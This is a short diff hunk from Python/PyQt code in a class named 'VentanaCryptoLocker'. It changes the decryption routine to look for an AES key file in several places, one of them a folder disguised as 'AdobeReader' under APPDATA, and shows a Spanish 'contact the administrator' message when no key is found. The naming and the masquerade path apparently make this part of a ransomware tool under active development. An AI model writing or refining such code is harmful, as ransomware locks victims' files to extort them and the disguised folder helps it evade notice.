@@ -496,12 +496,25 @@ class VentanaCryptoLocker(QMainWindow):
             from cryptography.hazmat.backends import default_backend
             
             # Leer clave desde archivo de configuración
-            key_file = os.path.join(os.path.dirname(sys.argv[0]), '.aes_key')
-            if os.path.exists(key_file):
-                with open(key_file, 'r') as f:
-                    key_hex = f.read().strip()
-                    key = bytes.fromhex(key_hex)
-            else:
+            # Buscar en múltiples ubicaciones donde el cliente puede guardar la clave
+            key = None
+            key_locations = [
+                os.path.join(os.environ.get('APPDATA', ''), 'AdobeReader', '.aes_key'),
+                os.path.join(os.path.dirname(sys.argv[0]), '.aes_key'),
+                os.path.join(os.getcwd(), '.aes_key')
+            ]
+            
+            for key_file in key_locations:
+                if os.path.exists(key_file):
+                    try:
+                        with open(key_file, 'r') as f:
+                            key_hex = f.read().strip()
+                            key = bytes.fromhex(key_hex)
+                        break
+                    except:
+                        continue
+            
+            if not key:
                 QMessageBox.warning(self, "Error", "Clave de descifrado no encontrada. Contacte al administrador.")
                 return
             
